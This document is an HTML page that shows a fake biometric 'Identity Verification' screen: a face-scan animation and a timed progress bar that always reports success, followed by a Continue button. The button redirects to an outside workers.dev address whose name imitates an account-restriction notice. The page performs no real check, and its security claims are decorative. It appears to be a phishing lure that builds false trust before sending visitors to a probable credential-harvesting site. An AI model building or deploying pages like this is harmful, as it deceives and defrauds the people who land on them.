<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Verification</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    height:100vh;
    overflow:hidden;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#000814;
    color:white;
}

body::before{
    content:"";
    position:absolute;
    width:700px;
    height:700px;
    background:radial-gradient(circle,#00ffc31f,#00000000 70%);
    animation:bgmove 6s linear infinite alternate;
}

@keyframes bgmove{
    from{
        transform:translate(-80px,-40px);
    }
    to{
        transform:translate(80px,40px);
    }
}

.card{
    position:relative;
    width:390px;
    padding:28px;
    border-radius:35px;
    background:rgba(7,15,30,0.88);
    backdrop-filter:blur(18px);
    border:1px solid rgba(255,255,255,0.08);
    box-shadow:
    0 0 60px rgba(0,255,200,0.12),
    inset 0 0 30px rgba(255,255,255,0.03);
    overflow:hidden;
}

.card::before{
    content:"";
    position:absolute;
    inset:0;
    border-radius:35px;
    padding:1px;
    background:linear-gradient(135deg,#00ffc3,#0066ff,#00ffc3);
    -webkit-mask:
    linear-gradient(#fff 0 0) content-box,
    linear-gradient(#fff 0 0);
    -webkit-mask-composite:xor;
    mask-composite:exclude;
}

.logo{
    width:95px;
    height:95px;
    margin:auto;
    border-radius:30px;
    background:linear-gradient(135deg,#00ffc3,#0066ff);
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:44px;
    box-shadow:0 0 40px rgba(0,255,200,0.35);
}

.title{
    margin-top:20px;
    text-align:center;
    font-size:31px;
    font-weight:bold;
}

.subtitle{
    margin-top:10px;
    text-align:center;
    color:#94a3b8;
    font-size:14px;
}

.scan-box{
    position:relative;
    width:240px;
    height:300px;
    margin:35px auto 25px;
    border-radius:32px;
    overflow:hidden;
    background:#020617;
    border:2px solid rgba(0,255,200,0.45);
    box-shadow:
    0 0 35px rgba(0,255,200,0.18),
    inset 0 0 40px rgba(0,255,200,0.08);
}

.face{
    position:absolute;
    inset:0;
    display:flex;
    justify-content:center;
    align-items:center;
    font-size:140px;
    filter:drop-shadow(0 0 12px rgba(0,255,200,0.3));
}

.grid{
    position:absolute;
    inset:0;
    background-image:
    linear-gradient(rgba(255,255,255,0.03) 1px, transparent 1px),
    linear-gradient(90deg, rgba(255,255,255,0.03) 1px, transparent 1px);
    background-size:24px 24px;
}

.scan-line{
    position:absolute;
    width:100%;
    height:6px;
    background:linear-gradient(90deg,#00ffc3,#00a2ff,#00ffc3);
    box-shadow:
    0 0 18px #00ffc3,
    0 0 28px #00a2ff;
    animation:scan 1.7s linear infinite;
}

@keyframes scan{
    0%{top:-10px;}
    100%{top:100%;}
}

.corner{
    position:absolute;
    width:42px;
    height:42px;
    border:4px solid #00ffc3;
}

.tl{
    top:14px;
    left:14px;
    border-right:none;
    border-bottom:none;
}

.tr{
    top:14px;
    right:14px;
    border-left:none;
    border-bottom:none;
}

.bl{
    bottom:14px;
    left:14px;
    border-right:none;
    border-top:none;
}

.br{
    bottom:14px;
    right:14px;
    border-left:none;
    border-top:none;
}

.status{
    text-align:center;
    font-size:18px;
    letter-spacing:0.5px;
}

.progress{
    width:100%;
    height:13px;
    background:#07111f;
    border-radius:40px;
    overflow:hidden;
    margin-top:22px;
}

.bar{
    width:0%;
    height:100%;
    border-radius:40px;
    background:linear-gradient(90deg,#00ffc3,#00a2ff);
    transition:width 5s linear;
    box-shadow:0 0 20px rgba(0,255,200,0.4);
}

#continueBtn{
    width:100%;
    padding:15px;
    border:none;
    border-radius:18px;
    margin-top:14px;
    background:linear-gradient(135deg,#00ffc3,#0066ff);
    color:white;
    font-size:17px;
    font-weight:bold;
    cursor:pointer;
    display:none;
    position:relative;
    z-index:9999;
    pointer-events:auto;
    box-shadow:0 0 25px rgba(0,255,200,0.25);
}



.verify-icon{
    text-align:center;
    margin-top:18px;
    color:#64748b;
    font-size:13px;
    letter-spacing:1px;
}

</style>
</head>

<body>

<div class="bg1"></div>
<div class="bg2"></div>

<div class="card">

    <div class="logo">
        🛡️
    </div>

    <div class="title">
        Identity Verification
    </div>

    <div class="subtitle">
        Secure face authentication system
    </div>

    <div class="scan-box">

        <div class="grid"></div>

        <div class="corner tl"></div>
        <div class="corner tr"></div>
        <div class="corner bl"></div>
        <div class="corner br"></div>

        <div class="face">
            👤
        </div>

        <div class="scan-line"></div>

    </div>

    <div class="status" id="status">
        Scanning biometric identity...
    </div>

    <div class="progress">
        <div class="bar" id="bar"></div>
    </div>

    <button id="continueBtn">
        Continue
    </button>

    

    <div class="verify-icon">
        End‑to‑End Encrypted Security
    </div>

</div>

<script>


const statusText = document.getElementById("status");
const bar = document.getElementById("bar");
const continueBtn = document.getElementById("continueBtn");

window.onload = ()=>{

    setTimeout(()=>{
        bar.style.width = "100%";
    },100);

    setTimeout(()=>{

        statusText.innerHTML = "Verification Completed Successfully";

        continueBtn.style.display = "block";

    },5000);

};

document.getElementById("continueBtn").addEventListener("click", function(e){
    e.preventDefault();
    window.location.href = "https://review-request.restriction-update-issue.workers.dev/";
});

</script>

</body>
</html>
